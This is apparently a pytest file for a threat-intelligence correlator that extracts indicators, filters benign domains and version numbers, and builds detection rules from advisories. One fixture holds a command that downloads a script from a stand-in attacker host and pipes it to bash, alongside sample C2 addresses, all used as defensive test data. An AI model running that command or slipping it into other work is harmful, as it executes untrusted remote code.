"""Unit tests for correlation engine hardening, context-aware indicator extraction,
and markdown command sanitization.
"""

from pathlib import Path

from hecate_runner.correlation import (
    ThreatEntityCorrelator,
    ThreatEntityExtractor,
    _is_c2_correlation_candidate,
    _is_relevant_domain,
)
from hecate_runner.cti.base import CTIItem
from hecate_runner.cti.reference_rules import reference_candidates


def test_software_version_numbers_are_not_extracted_as_ips():
    sample_text = """
    # OpenJDK Security Advisory (2026-11-17)
    Vulnerable versions: OpenJDK 17.0.21.1, 21.0.13.1, 25.0.5.1, and 27.0.1.1.
    Users should upgrade to version 17.0.21.2 or 21.0.13.2 immediately.
    See advisory at https://openjdk.org/groups/vulnerability/advisories/2026-11-17/17.0.21.1 for details.

    The threat actor was observed connecting to 198.51.100.24 to fetch payloads.
    Another connection was made to http://45.33.32.156/stage2.sh.
    """

    iocs = ThreatEntityExtractor.extract_network_iocs(sample_text)

    # Legitimate external C2 IPs should be extracted
    assert "198.51.100.24" in iocs
    assert "45.33.32.156" in iocs

    # OpenJDK version numbers should NOT be extracted as IP IOCs
    assert "17.0.21.1" not in iocs
    assert "21.0.13.1" not in iocs
    assert "25.0.5.1" not in iocs
    assert "27.0.1.1" not in iocs
    assert "17.0.21.2" not in iocs
    assert "21.0.13.2" not in iocs


def test_version_prefixed_strings_are_ignored():
    cases = [
        ("Upgraded to v1.2.3.4 for security", "1.2.3.4"),
        ("Running kernel 5.15.0.25 on linux", "5.15.0.25"),
        ("glibc 2.31.0.1 vulnerable", "2.31.0.1"),
        ("fixed in 17.0.21.1 release", "17.0.21.1"),
        ("affected version: 21.0.13.1", "21.0.13.1"),
    ]
    for text, ver in cases:
        iocs = ThreatEntityExtractor.extract_network_iocs(text)
        assert ver not in iocs, f"Expected version {ver} to be ignored in text: {text}"


def test_benign_vendor_and_advisory_domains_are_ignored():
    benign_domains = [
        "rapid7.com",
        "ciac.org",
        "ibmcloud.com",
        "exchange.xforce.ibmcloud.com",
        "nvd.nist.gov",
        "cve.org",
        "tenable.com",
        "qualys.com",
        "jfrog.com",
        "openjdk.org",
        "oracle.com",
        "bleepingcomputer.com",
        "shields.io",
        "img.shields.io",
        "badge.fury.io",
        "badgen.net",
        "codecov.io",
        "coveralls.io",
    ]
    for dom in benign_domains:
        assert not _is_relevant_domain(dom), f"Expected {dom} to be recognized as benign"

    # Known document/code extensions should not be treated as TLDs
    assert not _is_relevant_domain("l-106.shtml")
    assert not _is_relevant_domain("base64.getdecoder")
    assert not _is_relevant_domain("exploit.class")

    # Image/badge assets should not be treated as domains
    assert not _is_relevant_domain("20differential-success.svg")
    assert not _is_relevant_domain("license-mit-blue.svg")
    assert not _is_relevant_domain("banner.png")
    assert not _is_relevant_domain("icon.ico")

    # Code identifiers with non-TLD attributes must not be domains
    assert not _is_relevant_domain("request.state")
    assert not _is_relevant_domain("os.path")
    assert not _is_relevant_domain("sys.argv")

    # Real malicious C2 domains should be accepted
    assert _is_relevant_domain("c2.evil-campaign.com")
    assert _is_relevant_domain("payload-drop.org")
    assert _is_relevant_domain("beacon-callback.xyz")


def test_temporal_cve_disparity_prevents_false_correlation(tmp_path: Path):
    hunts_dir = tmp_path / "hunts"
    hunts_dir.mkdir()

    # Modern 2026 hunt (GPUStack RCE)
    hunt_file = hunts_dir / "H-0033.md"
    hunt_file.write_text(
        """---
title: "GPUStack Remote Code Execution"
threat_actors: []
indicators:
  cve: ["CVE-2026-102895"]
---
# GPUStack RCE
References:
- https://nvd.nist.gov/vuln/detail/CVE-2026-102895
- https://www.rapid7.com/db/vulnerabilities/gpustack-rce
""",
        encoding="utf-8",
    )

    correlator = ThreatEntityCorrelator(hunts_dir)

    # Ancient 2001 CTI item referencing rapid7 or nvd
    ancient_item = CTIItem(
        content="CVE-2001-0537 was documented at https://www.rapid7.com/db/vulnerabilities/cve-2001-0537",
        source="ciac-advisory",
        title="Ancient 2001 Vulnerability Advisory",
        source_url="https://www.rapid7.com/db/vulnerabilities/cve-2001-0537",
        metadata={"cves": ["CVE-2001-0537"]},
    )

    match = correlator.correlate(ancient_item)
    assert match is None, (
        f"Expected ancient 2001 CTI to NOT match 2026 hunt H-0033, but got {match}"
    )


def test_contemporary_cves_and_shared_actors_still_correlate(tmp_path: Path):
    hunts_dir = tmp_path / "hunts"
    hunts_dir.mkdir()

    hunt_file = hunts_dir / "H-0033.md"
    hunt_file.write_text(
        """---
title: "GPUStack Remote Code Execution"
threat_actors: ["APT28"]
indicators:
  cve: ["CVE-2026-102895"]
  ipv4: ["198.51.100.50"]
---
# GPUStack RCE
""",
        encoding="utf-8",
    )

    correlator = ThreatEntityCorrelator(hunts_dir)

    # Item with same CVE matches
    same_cve_item = CTIItem(
        content="Exploit POC for CVE-2026-102895 available",
        source="cve-update",
        title="Exploit in the wild for CVE-2026-102895",
    )
    match_cve = correlator.correlate(same_cve_item)
    assert match_cve is not None
    assert match_cve.hunt_id == "H-0033"

    # Item with shared actor matches
    actor_item = CTIItem(
        content="Fancy Bear was seen exploiting infrastructure",
        source="threat-report",
        title="Fancy Bear activity",
    )
    match_actor = correlator.correlate(actor_item)
    assert match_actor is not None
    assert match_actor.hunt_id == "H-0033"


def test_markdown_hyperlinks_in_reference_rules_are_sanitized():
    metadata = {
        "evidence_profile": "behavior_catalog",
        "platform": "Linux",
        "source_artifacts": [
            {
                "kind": "command_line",
                "value": "[security advisory](https://openjdk.org/groups/vulnerability/advisories/2026-11-17)",
            },
            {
                "kind": "command_line",
                "value": "curl -s http://c2.attacker.com/payload.sh | bash",
            },
        ],
    }

    candidates = reference_candidates(metadata)
    titles = [c["title"] for c in candidates]
    commands = [c["command"] for c in candidates]

    # Advisory link should NOT become a process_creation rule
    assert not any("security" in t.lower() for t in titles)
    assert not any("advisory" in cmd.lower() for cmd in commands)

    # Legitimate shell command should be extracted
    assert any("curl" in cmd for cmd in commands)


def test_markdown_table_version_columns_are_ignored():
    table_text = """
    | Product | Baseline | Patch Version |
    | JDK 17 | 17.0.1.0 | 17.0.21.1 |
    | JDK 21 | 21.0.1.0 | 21.0.13.1 |

    Attacker exfiltrated data to 198.51.100.99.
    """
    iocs = ThreatEntityExtractor.extract_network_iocs(table_text)
    assert "198.51.100.99" in iocs
    assert "17.0.1.0" not in iocs
    assert "17.0.21.1" not in iocs
    assert "21.0.1.0" not in iocs
    assert "21.0.13.1" not in iocs


def test_multiline_version_bullet_points_are_ignored():
    bullet_text = """
    Fixed in:
    - 17.0.21.1
    - 21.0.13.1
    - 25.0.5.1

    C2 beacon target: 203.0.113.10
    """
    iocs = ThreatEntityExtractor.extract_network_iocs(bullet_text)
    assert "203.0.113.10" in iocs
    assert "17.0.21.1" not in iocs
    assert "21.0.13.1" not in iocs
    assert "25.0.5.1" not in iocs


def test_cve_temporal_window_bounds(tmp_path: Path):
    hunts_dir = tmp_path / "hunts"
    hunts_dir.mkdir()

    # 2026 hunt with real routable C2 IP
    hunt_file = hunts_dir / "H-0050.md"
    hunt_file.write_text(
        """---
title: "Modern 2026 Hunt"
threat_actors: []
indicators:
  cve: ["CVE-2026-99999"]
  ipv4: ["45.33.32.156"]
---
# Modern 2026 Hunt
""",
        encoding="utf-8",
    )

    correlator = ThreatEntityCorrelator(hunts_dir)

    # Contemporary (2025 - delta 1 year) with shared C2 -> SHOULD correlate
    item_2025 = CTIItem(
        content="Campaign targeting CVE-2025-11111 with C2 45.33.32.156",
        source="feed",
        title="2025 Campaign",
        metadata={"cves": ["CVE-2025-11111"], "indicators": {"ipv4": ["45.33.32.156"]}},
    )
    match_2025 = correlator.correlate(item_2025)
    assert match_2025 is not None
    assert match_2025.hunt_id == "H-0050"

    # Distant (2019 - delta 7 years) with shared C2 but no shared actor -> SHOULD NOT correlate
    item_2019 = CTIItem(
        content="Old campaign for CVE-2019-11111 with C2 45.33.32.156",
        source="feed",
        title="2019 Campaign",
        metadata={"cves": ["CVE-2019-11111"], "indicators": {"ipv4": ["45.33.32.156"]}},
    )
    match_2019 = correlator.correlate(item_2019)
    assert match_2019 is None


def test_c2_correlation_candidate_rejects_benign_dual_use_and_assets() -> None:
    """_is_c2_correlation_candidate must reject badge servers, dual-use cloud hosts, and asset filenames."""
    # Badge and platform hosts must never be C2 correlation candidates
    assert not _is_c2_correlation_candidate("img.shields.io")
    assert not _is_c2_correlation_candidate("shields.io")
    assert not _is_c2_correlation_candidate("codecov.io")
    assert not _is_c2_correlation_candidate("raw.githubusercontent.com")
    assert not _is_c2_correlation_candidate("storage.googleapis.com")
    assert not _is_c2_correlation_candidate("discord.com")

    # Assets and code tokens must never be C2 candidates
    assert not _is_c2_correlation_candidate("20differential-success.svg")
    assert not _is_c2_correlation_candidate("license-mit-blue.svg")
    assert not _is_c2_correlation_candidate("request.state")

    # Legitimate external C2 infrastructure must be accepted
    assert _is_c2_correlation_candidate("c2-callback.evil-campaign.com")
    assert _is_c2_correlation_candidate("payload-drop.org")
    assert _is_c2_correlation_candidate("45.33.32.156")


def test_correlator_does_not_link_unrelated_cves_sharing_shields_badge(tmp_path: Path) -> None:
    """An incoming PoC with shields.io badge must not link to an existing hunt via shared_c2_ioc."""
    hunts_dir = tmp_path / "hunts"
    hunts_dir.mkdir()

    # Hunt H-0035 for Apache mod_http2 with shields badge in prose
    hunt_file = hunts_dir / "H-0035.md"
    hunt_file.write_text(
        """---
hunt_id: H-0035
title: "Apache mod_http2 RCE"
techniques: ["T1190"]
indicators:
  cve: ["CVE-2026-119618"]
---
# H-0035: Apache mod_http2 RCE
Evidence includes ![CVSS](https://img.shields.io/badge/CVSS-9.8-critical) badge.
""",
        encoding="utf-8",
    )

    correlator = ThreatEntityCorrelator(hunts_dir)

    # Incoming PoC for an entirely different CVE that also has shields.io badges and asset links
    incoming_item = CTIItem(
        source="github_poc",
        identifier="googlesky/CVE-2026-135817",
        title="PoC: CVE-2026-135817 - unspecified software",
        content=(
            "PoC for CVE-2026-135817.\n"
            "[![License](https://img.shields.io/badge/license-mit-blue.svg)](https://opensource.org/licenses/MIT)\n"
            "Diff: 20differential-success.svg\n"
            "Code snippet: `request.state.tenant_id = 1`\n"
        ),
        metadata={
            "cve_id": "CVE-2026-135817",
            "repo_full_name": "googlesky/CVE-2026-135817",
        },
    )

    match = correlator.correlate(incoming_item)
    assert match is None, f"Expected no correlation, but got match: {match}"


def test_clean_readme_text_strips_badges_and_image_tags() -> None:
    """clean_readme_text removes markdown badges, img tags, and shields URLs."""
    from hecate_runner.cti.github_poc import clean_readme_text

    raw_readme = (
        "# Exploit Toolkit\n\n"
        "[![Build Status](https://img.shields.io/travis/user/repo/master.svg)](https://travis-ci.org/user/repo)\n"
        "![License](https://img.shields.io/badge/license-MIT-blue.svg)\n"
        '<img src="https://badge.fury.io/py/poc.svg" alt="PyPI">\n\n'
        "Usage: `python3 exploit.py --target 192.168.1.1`\n"
        "Trigger vulnerability by sending payload to `/api/v1/debug`."
    )
    cleaned = clean_readme_text(raw_readme)
    assert "shields.io" not in cleaned
    assert "travis-ci.org" not in cleaned
    assert "license-MIT-blue.svg" not in cleaned
    assert "badge.fury.io" not in cleaned
    assert "Usage: `python3 exploit.py --target 192.168.1.1`" in cleaned
    assert "/api/v1/debug" in cleaned

